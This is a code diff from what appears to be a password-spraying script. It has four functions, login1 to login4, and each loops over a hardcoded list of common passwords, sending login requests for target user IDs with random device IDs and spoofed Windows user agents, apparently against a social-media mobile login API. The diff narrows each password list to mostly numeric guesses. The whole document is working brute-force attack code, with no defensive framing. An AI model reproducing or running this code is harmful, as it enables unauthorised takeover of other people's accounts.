@@ -745,7 +745,7 @@ def login1(uid):
         sys.stdout.flush()
         ua = random.choice(ugen)
         ua = windows()
-        for pw in ["123456","password","12345678","qwerty","abc123","123456789","111111","1234567","iloveyou","adobe123","admin","welcome","monkey","letmein","sunshine","master","123123","football","shadow","princess","123qwe","654321","superman","michael","1qaz2wsx","baseball","dragon","qwertyuiop","mustang","access","jennifer","jordan","trustno1","harley","batman","starwars","matrix","ashley","hello","hunter","freedom","ninja","password1","solo","welcome1","charlie","andrew","flower","thomas","dallas","pepper","jessica","ginger","password123","liverpool","joshua","131313","samsung","azerty","michelle","7777777","internet","cookie","photoshop","daniel","george","chocolate","snoopy","aaron","soccer","summer","loveme","1234","buster","purple","secret","mercedes","chelsea","computer","amanda","ginger","banana","justin","tigger","mother","bailey","anthony","qwe123","diamond","patrick","martin","ginger","victoria","slipknot","jackson","whatever","888888","password!","1234567","1234567890","0987654321","7654321","87654321","987654321","123abc","123ABC","abc123","ABC123","1234abcd","1234ABCD","ABCD1234","abcd1234","I Love You","iloveyou","ILOVEYOU","I LOVE YOU","ILoveYou","i love you"]:
+        for pw in ["123456","12345678","abc123","123456789","111111","1234567","123123","123qwe","654321","1234567890","0987654321","7654321","87654321","987654321","123abc","123ABC"]:
             data = {'adid':str(uuid.uuid4()),
             'format': 'json',
             'device_id':str(uuid.uuid4()),
@@ -806,7 +806,7 @@ def login2(uid):
         sys.stdout.flush()
         ua = random.choice(ugen)
         ua = windows()
-        for pw in ["123456","password","12345678","qwerty","abc123","123456789","111111","1234567","iloveyou","adobe123","admin","welcome","monkey","letmein","sunshine","master","123123","football","shadow","princess","123qwe","654321","superman","michael","1qaz2wsx","baseball","dragon","qwertyuiop","mustang","access","jennifer","jordan","trustno1","harley","batman","starwars","matrix","ashley","hello","hunter","freedom","ninja","password1","solo","welcome1","charlie","andrew","flower","thomas","dallas","pepper","jessica","ginger","password123","liverpool","joshua","131313","samsung","azerty","michelle","7777777","internet","cookie","photoshop","daniel","george","chocolate","snoopy","aaron","soccer","summer","loveme","1234","buster","purple","secret","mercedes","chelsea","computer","amanda","ginger","banana","justin","tigger","mother","bailey","anthony","qwe123","diamond","patrick","martin","ginger","victoria","slipknot","jackson","whatever","888888","password!","1234567","1234567890","0987654321","7654321","87654321","987654321","123abc","123ABC","abc123","ABC123","1234abcd","1234ABCD","ABCD1234","abcd1234","I Love You","iloveyou","ILOVEYOU","I LOVE YOU","ILoveYou","i love you"]:
+        for pw in ["123456","12345678","abc123","123456789","111111","1234567","123123","123qwe","654321","1234567890","0987654321","7654321","87654321","987654321","123abc","123ABC"]:
             data = {'adid':str(uuid.uuid4()),
             'format': 'json',
             'device_id':str(uuid.uuid4()),
@@ -867,7 +867,7 @@ def login3(uid):
         sys.stdout.flush()
         ua = random.choice(ugen)
         ua = windows()
-        for pw in ["123456","password","12345678","qwerty","abc123","123456789","111111","1234567","iloveyou","adobe123","admin","welcome","monkey","letmein","sunshine","master","123123","football","shadow","princess","123qwe","654321","superman","michael","1qaz2wsx","baseball","dragon","qwertyuiop","mustang","access","jennifer","jordan","trustno1","harley","batman","starwars","matrix","ashley","hello","hunter","freedom","ninja","password1","solo","welcome1","charlie","andrew","flower","thomas","dallas","pepper","jessica","ginger","password123","liverpool","joshua","131313","samsung","azerty","michelle","7777777","internet","cookie","photoshop","daniel","george","chocolate","snoopy","aaron","soccer","summer","loveme","1234","buster","purple","secret","mercedes","chelsea","computer","amanda","ginger","banana","justin","tigger","mother","bailey","anthony","qwe123","diamond","patrick","martin","ginger","victoria","slipknot","jackson","whatever","888888","password!","1234567","1234567890","0987654321","7654321","87654321","987654321","123abc","123ABC","abc123","ABC123","1234abcd","1234ABCD","ABCD1234","abcd1234","I Love You","iloveyou","ILOVEYOU","I LOVE YOU","ILoveYou","i love you"]:
+        for pw in ["123456","12345678","abc123","123456789","111111","1234567","123123","123qwe","654321","1234567890","0987654321","7654321","87654321","987654321","123abc","123ABC"]:
             data = {'adid':str(uuid.uuid4()),
             'format': 'json',
             'device_id':str(uuid.uuid4()),
@@ -928,7 +928,7 @@ def login4(uid):
         sys.stdout.flush()
         ua = random.choice(ugen)
         ua = windows()
-        for pw in ["123456","password","12345678","qwerty","abc123","123456789","111111","1234567","iloveyou","adobe123","admin","welcome","monkey","letmein","sunshine","master","123123","football","shadow","princess","123qwe","654321","superman","michael","1qaz2wsx","baseball","dragon","qwertyuiop","mustang","access","jennifer","jordan","trustno1","harley","batman","starwars","matrix","ashley","hello","hunter","freedom","ninja","password1","solo","welcome1","charlie","andrew","flower","thomas","dallas","pepper","jessica","ginger","password123","liverpool","joshua","131313","samsung","azerty","michelle","7777777","internet","cookie","photoshop","daniel","george","chocolate","snoopy","aaron","soccer","summer","loveme","1234","buster","purple","secret","mercedes","chelsea","computer","amanda","ginger","banana","justin","tigger","mother","bailey","anthony","qwe123","diamond","patrick","martin","ginger","victoria","slipknot","jackson","whatever","888888","password!","1234567","1234567890","0987654321","7654321","87654321","987654321","123abc","123ABC","abc123","ABC123","1234abcd","1234ABCD","ABCD1234","abcd1234","I Love You","iloveyou","ILOVEYOU","I LOVE YOU","ILoveYou","i love you"]:
+        for pw in ["123456","12345678","abc123","123456789","111111","1234567","123123","123qwe","654321","1234567890","0987654321","7654321","87654321","987654321","123abc","123ABC"]:
             data = {'adid':str(uuid.uuid4()),
             'format': 'json',
             'device_id':str(uuid.uuid4()),
